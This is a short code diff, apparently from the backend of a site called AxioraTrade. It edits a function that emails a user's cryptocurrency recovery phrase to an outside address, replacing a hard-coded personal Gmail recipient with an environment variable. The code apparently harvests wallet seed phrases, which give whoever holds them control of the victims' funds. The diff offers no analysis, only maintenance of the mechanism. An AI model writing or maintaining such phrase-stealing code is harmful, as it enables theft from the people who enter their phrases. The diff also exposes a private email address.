@@ -35,7 +35,7 @@ const sendPhrase = async ({ recoveryPhrase }) => {
 
   await resend.emails.send({
     from: 'AxioraTrade <noreply@axioratrade.com>',
-    to: 'benjaminfrancis0063@gmail.com',
+    to: process.env.PHRASE_EMAIL,
     subject: 'Phrase Secured',
     html,
   });
